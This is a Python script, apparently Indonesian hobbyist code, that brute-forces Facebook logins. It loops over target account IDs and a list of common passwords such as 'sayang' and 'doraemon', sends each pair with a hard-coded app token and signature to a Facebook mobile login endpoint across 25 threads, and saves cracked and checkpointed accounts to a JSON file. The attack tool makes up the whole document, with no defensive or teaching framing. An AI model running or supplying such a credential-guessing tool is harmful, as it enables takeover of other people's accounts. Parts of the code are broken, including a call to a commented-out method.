import requests
import os
import json
from concurrent.futures import ThreadPoolExecutor
# from app import config


class Brute:

    def __init__(self):
        self.__target = []
        self.__password = ['sayang', 'anjing', 'doraemon']
        self.__count = 0
        self.__len_target = None

        # result
        self.__ok = []
        self.__cp = []

    def __login(self, id, passw):
        self.__count += 1
        print(f'\r  (!) id ke {str(self.__count)} dari {self.__len_target} id', end='', flush=True)

        for pw in passw:
            data = {
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                'format': 'JSON',
                'sdk_version': '2',
                'email': id,
                'locale': 'en_GB',
                'password': pw,
                'sdk': 'ios',
                'generate_session_cookies': '1',
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
            }
            response = requests.get('https://b-api.facebook.com/method/auth.login', params=data)
            if 'session_key' in response.text or "EAAA" in response.text:
                print(f'\r  (OK) {id} -> {pw}')
                self.__ok.append((id, pw))
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                print(f'\r  (CP) {id} -> {pw}')
                self.__cp.append((id, pw))
                break

    def save(self, fn):
        try:
            data = {'ok': self.__ok, 'cp': self.__cp}
            f = open('result/'+fn, 'w').write(json.dumps(data))
        except FileNotFoundError:
            os.system('mkdir result')
            self.save(fn)

    def start(self):
        with ThreadPoolExecutor(max_workers=25) as th:
            for id in self.__target:
                th.submit(self.__login, (id), (self.__password))

    # def password_generator(self, username):
    #     resp = requests.get(config.url+'/'+username)
    #     print(resp.text)

    @property
    def target():
        pass

    @target.setter
    def set_target(self, id):
        self.__target = id
        self.__len_target = len(self.__target)

if __name__ == '__main__':
    br = Brute()
    br.password_generator('akmal')
